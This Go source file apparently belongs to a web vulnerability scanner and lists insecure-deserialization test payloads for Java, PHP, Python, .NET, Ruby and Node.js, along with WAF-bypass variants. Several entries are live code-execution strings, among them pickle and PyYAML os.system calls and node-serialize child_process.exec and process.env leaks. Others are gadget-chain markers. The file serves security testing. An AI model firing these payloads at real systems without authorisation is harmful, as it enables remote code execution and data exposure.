// Package deser provides insecure deserialization payloads for multiple platforms.
// Payloads are categorized by:
//   - Serialization variant (Java, PHP, Python, .NET)
//   - Detection technique (Marker, Error, Time-based, Blind)
//   - Context (Object markers, class instantiation, gadget chains)
package deser

// Variant represents a serialization platform variant.
type Variant string

const (
	// Java represents Java serialization (ObjectInputStream).
	Java Variant = "java"
	// PHP represents PHP serialize/unserialize.
	PHP Variant = "php"
	// Python represents Python pickle deserialization.
	Python Variant = "python"
	// DotNet represents .NET BinaryFormatter/ObjectStateFormatter.
	DotNet Variant = "dotnet"
	// Ruby represents Ruby Marshal / YAML deserialization.
	Ruby Variant = "ruby"
	// NodeJS represents Node.js node-serialize / funcster.
	NodeJS Variant = "nodejs"
	// Generic represents generic deserialization markers.
	Generic Variant = "generic"
)

// Technique represents a detection technique.
type Technique string

const (
	// TechMarker uses serialized object markers to detect deserialization.
	TechMarker Technique = "marker"
	// TechError triggers deserialization errors for detection.
	TechError Technique = "error"
	// TechTimeBased uses time delays during deserialization.
	TechTimeBased Technique = "time"
	// TechBlind uses out-of-band callbacks for detection.
	TechBlind Technique = "blind"
)

// Payload represents a deserialization test payload.
type Payload struct {
	Value       string
	Technique   Technique
	Variant     Variant
	Description string
	WAFBypass   bool
}

// GetPayloads returns payloads for a specific serialization variant.
func GetPayloads(variant Variant) []Payload {
	switch variant {
	case Java:
		return javaPayloads
	case PHP:
		return phpPayloads
	case Python:
		return pythonPayloads
	case DotNet:
		return dotnetPayloads
	case Ruby:
		return rubyPayloads
	case NodeJS:
		return nodejsPayloads
	default:
		return genericPayloads
	}
}

// GetByTechnique returns payloads filtered by technique.
func GetByTechnique(variant Variant, technique Technique) []Payload {
	all := GetPayloads(variant)
	var result []Payload
	for _, p := range all {
		if p.Technique == technique {
			result = append(result, p)
		}
	}
	return result
}

// GetWAFBypassPayloads returns payloads designed for WAF evasion.
func GetWAFBypassPayloads(variant Variant) []Payload {
	all := GetPayloads(variant)
	var result []Payload
	for _, p := range all {
		if p.WAFBypass {
			result = append(result, p)
		}
	}
	return result
}

// GetAllPayloads returns all payloads for all variants.
func GetAllPayloads() []Payload {
	var all []Payload
	all = append(all, genericPayloads...)
	all = append(all, javaPayloads...)
	all = append(all, phpPayloads...)
	all = append(all, pythonPayloads...)
	all = append(all, dotnetPayloads...)
	all = append(all, rubyPayloads...)
	all = append(all, nodejsPayloads...)
	all = append(all, ysoserialMarkers...)
	all = append(all, phpggcMarkers...)
	return all
}

// DeduplicatePayloads removes duplicate payloads based on Value and Variant.
func DeduplicatePayloads(payloads []Payload) []Payload {
	seen := make(map[string]bool)
	var result []Payload
	for _, p := range payloads {
		key := p.Value + "|" + string(p.Variant)
		if !seen[key] {
			seen[key] = true
			result = append(result, p)
		}
	}
	return result
}

// Generic deserialization payloads that work across multiple platforms.
var genericPayloads = []Payload{
	{Value: "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Generic, Description: "Java serialized Boolean marker"},
	{Value: `O:8:"stdClass":0:{}`, Technique: TechMarker, Variant: Generic, Description: "PHP serialized stdClass marker"},
	{Value: "cos\nsystem\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Generic, Description: "Python pickle system call marker"},
	{Value: `{"$type":"System.Object"}`, Technique: TechMarker, Variant: Generic, Description: ".NET JSON type discriminator"},
}

// Java-specific deserialization payloads.
// Source: ysoserial, PayloadsAllTheThings
var javaPayloads = []Payload{
	// Base64-encoded Java serialization markers
	{Value: "rO0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "Java serialized Boolean object"},
	{Value: "rO0ABXNyABNqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAABh", Technique: TechMarker, Variant: Java, Description: "Java serialized Integer object"},
	{Value: "aced00057372001164756d6d792e64756d6d79", Technique: TechMarker, Variant: Java, Description: "Java magic bytes hex prefix aced0005"},

	// Error-triggering payloads
	{Value: "rO0ABXNyAA9pbnZhbGlkLkNsYXNzAA==", Technique: TechError, Variant: Java, Description: "Invalid class deserialization error"},
	{Value: "rO0ABXhyABdqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIAAA==", Technique: TechError, Variant: Java, Description: "ProcessBuilder deserialization attempt"},
	{Value: "aced0005737200", Technique: TechError, Variant: Java, Description: "Truncated Java serialized object"},

	// Time-based
	{Value: "rO0ABXNyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXA=", Technique: TechTimeBased, Variant: Java, Description: "Commons Collections LazyMap gadget"},

	// WAF bypass variants
	{Value: "ro0ABXNyABFqYXZhLmxhbmcuQm9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "Case-varied base64 Java marker", WAFBypass: true},
	{Value: "rO0ABXNyABFqYXZhLm%6Chbmcu%51m9vbGVhbtmQIJgR3MKCAAB4cA==", Technique: TechMarker, Variant: Java, Description: "URL-encoded base64 Java marker", WAFBypass: true},
}

// PHP-specific deserialization payloads.
// Source: PHPGGC, PayloadsAllTheThings
var phpPayloads = []Payload{
	// PHP serialize markers
	{Value: `O:8:"stdClass":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP stdClass serialized object"},
	{Value: `O:7:"TestObj":1:{s:4:"test";s:5:"value";}`, Technique: TechMarker, Variant: PHP, Description: "PHP custom object serialized"},
	{Value: `a:1:{s:4:"test";s:5:"value";}`, Technique: TechMarker, Variant: PHP, Description: "PHP serialized array"},
	{Value: `O:11:"PharPayload":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP Phar deserialization marker"},

	// Error-triggering payloads
	{Value: `O:99:"NonExistentClass":0:{}`, Technique: TechError, Variant: PHP, Description: "Non-existent class deserialization"},
	{Value: `O:8:"stdClass":1:{s:1:"x";O:99:"BadClass":0:{}}`, Technique: TechError, Variant: PHP, Description: "Nested bad class deserialization"},
	{Value: `O:`, Technique: TechError, Variant: PHP, Description: "Truncated PHP serialize string"},

	// Gadget chain markers
	{Value: `O:40:"Illuminate\\Broadcasting\\PendingBroadcast":0:{}`, Technique: TechMarker, Variant: PHP, Description: "Laravel PendingBroadcast gadget marker"},
	{Value: `O:32:"Monolog\\Handler\\SyslogUdpHandler":0:{}`, Technique: TechMarker, Variant: PHP, Description: "Monolog SyslogUdpHandler gadget marker"},

	// WAF bypass
	{Value: `O:+8:"stdClass":0:{}`, Technique: TechMarker, Variant: PHP, Description: "PHP serialize with plus sign bypass", WAFBypass: true},
	{Value: `O:8:"stdClass":0:{}; `, Technique: TechMarker, Variant: PHP, Description: "PHP serialize with trailing data bypass", WAFBypass: true},
}

// Python-specific deserialization payloads.
// Source: PayloadsAllTheThings
var pythonPayloads = []Payload{
	// Python pickle markers
	{Value: "cos\nsystem\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Python, Description: "Python pickle os.system call"},
	{Value: "csubprocess\ncall\n(S'echo test'\ntR.", Technique: TechMarker, Variant: Python, Description: "Python pickle subprocess.call"},
	{Value: "\\x80\\x04\\x95", Technique: TechMarker, Variant: Python, Description: "Python pickle protocol 4 header"},
	{Value: "gASV", Technique: TechMarker, Variant: Python, Description: "Python pickle protocol 4 base64 header"},

	// Error-triggering payloads
	{Value: "cos\n_INVALID_\n(tR.", Technique: TechError, Variant: Python, Description: "Invalid pickle module reference"},
	{Value: "\\x80\\x04\\x95\\x00\\x00\\x00\\x00", Technique: TechError, Variant: Python, Description: "Truncated pickle payload"},

	// YAML deserialization (PyYAML)
	{Value: "!!python/object:__main__.TestObj {}", Technique: TechMarker, Variant: Python, Description: "PyYAML object instantiation marker"},
	{Value: "!!python/object/apply:os.system ['echo test']", Technique: TechMarker, Variant: Python, Description: "PyYAML os.system apply marker"},

	// WAF bypass
	{Value: "Y29zCnN5c3RlbQooUydlY2hvIHRlc3QnCnRSLg==", Technique: TechMarker, Variant: Python, Description: "Base64-encoded pickle payload", WAFBypass: true},
}

// .NET-specific deserialization payloads.
// Source: ysoserial.net, PayloadsAllTheThings
var dotnetPayloads = []Payload{
	// .NET serialization markers
	{Value: `__VIEWSTATE=/wEPDw==`, Technique: TechMarker, Variant: DotNet, Description: ".NET ViewState marker"},
	{Value: `{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework"}`, Technique: TechMarker, Variant: DotNet, Description: ".NET ObjectDataProvider JSON marker"},
	{Value: `{"$type":"System.Configuration.Install.AssemblyInstaller"}`, Technique: TechMarker, Variant: DotNet, Description: ".NET AssemblyInstaller JSON marker"},

	// Error-triggering payloads
	{Value: `__VIEWSTATE=AAAA`, Technique: TechError, Variant: DotNet, Description: "Invalid ViewState deserialization"},
	{Value: `{"$type":"System.InvalidClass, System"}`, Technique: TechError, Variant: DotNet, Description: "Invalid .NET type reference"},
	{Value: `<root type="System.Data.DataSet"><xs:schema></xs:schema></root>`, Technique: TechError, Variant: DotNet, Description: "DataSet XML deserialization marker"},

	// TypeConfuseDelegate gadget
	{Value: `{"$type":"System.Workflow.ComponentModel.Serialization.TypeConfuseDelegate"}`, Technique: TechMarker, Variant: DotNet, Description: "TypeConfuseDelegate gadget marker"},

	// WAF bypass
	{Value: `{"$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework"}`, Technique: TechMarker, Variant: DotNet, Description: "Spaced JSON type discriminator bypass", WAFBypass: true},
}

// --- HackTricks / PayloadAllTheThings expansion ---

// Ruby Marshal / YAML deserialization markers.
// Source: PayloadsAllTheThings (Insecure Deserialization/Ruby.md),
// HackTricks (pentesting-web/deserialization/basic-.net-deserialization-ruby.md).
var rubyPayloads = []Payload{
	{Value: "\x04\x08", Technique: TechMarker, Variant: Ruby, Description: "Ruby Marshal v4.8 magic bytes"},
	{Value: "BAh7BjoIa2V5OgZ2", Technique: TechMarker, Variant: Ruby, Description: "Ruby Marshal hash (base64)"},
	{Value: "!ruby/object:Gem::Installer", Technique: TechMarker, Variant: Ruby, Description: "YAML universal RCE chain (Gem::Installer)"},
	{Value: "!ruby/object:ERB", Technique: TechMarker, Variant: Ruby, Description: "ERB object instantiation (template RCE)"},
	{Value: "!ruby/hash:ActiveSupport::HashWithIndifferentAccess", Technique: TechMarker, Variant: Ruby, Description: "ActiveSupport HashWithIndifferentAccess gadget"},
	{Value: "!ruby/struct:Net::SMTP::Response", Technique: TechMarker, Variant: Ruby, Description: "Net::SMTP::Response gadget marker"},
	{Value: "--- !ruby/object:Object {}", Technique: TechError, Variant: Ruby, Description: "Generic Ruby YAML object error trigger"},
}

// Node.js node-serialize / funcster RCE markers.
// Source: PayloadsAllTheThings (Insecure Deserialization/NodeJS.md).
var nodejsPayloads = []Payload{
	{Value: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id', function(err, data){console.log(data);});}()"}`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize IIFE RCE marker"},
	{Value: `{"rce":"_$$ND_FUNC$$_function(){return process.env;}()"}`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize env leak"},
	{Value: `_$$ND_FUNC$$_`, Technique: TechMarker, Variant: NodeJS, Description: "node-serialize function marker (any context)"},
}

// ysoserialMarkers are JRMP / RMI registry / RPC markers and the
// distinctive base64 prefixes of the most common ysoserial gadget
// chains (CommonsCollections1, CommonsBeanutils1, Hibernate1).
var ysoserialMarkers = []Payload{
	{Value: "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlcg==", Technique: TechMarker, Variant: Java, Description: "ysoserial AnnotationInvocationHandler gadget prefix"},
	{Value: "rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHA=", Technique: TechMarker, Variant: Java, Description: "ysoserial ArrayList wrapper prefix"},
	{Value: "rO0ABXNyACRzdW4ucnBjLnJlZ2lzdHJ5LlJlbW90ZUNhbGwAAA==", Technique: TechMarker, Variant: Java, Description: "ysoserial RMI RemoteCall prefix"},
	{Value: "rO0ABXNyABxqYXZhLnV0aWwuQ29sbGVjdGlvbnMkRW1wdHlMaXN0", Technique: TechMarker, Variant: Java, Description: "Collections$EmptyList wrapper (Hibernate1 gadget)"},
}

// phpggcMarkers expose distinctive class-name prefixes for the most
// commonly-exploited PHPGGC gadget chains.
// Source: ambionics/phpggc PayloadAllTheThings, HackTricks PHP
// deserialization page.
var phpggcMarkers = []Payload{
	{Value: `O:34:"Symfony\Component\Process\Process"`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Symfony/RCE1 chain marker"},
	{Value: `O:25:"Symfony\Component\HttpClient":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Symfony HttpClient marker"},
	{Value: `O:20:"Doctrine\Common\Util":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Doctrine FW1 marker"},
	{Value: `O:22:"Guzzle\Http\Client":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC Guzzle/RCE1 chain marker"},
	{Value: `O:24:"PhpOption\LazyOption":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC PhpOption/POP1 marker"},
	{Value: `O:35:"SwiftMailer\Transport\SpoolTransport":`, Technique: TechMarker, Variant: PHP, Description: "PHPGGC SwiftMailer/FD1 (file delete)"},
}
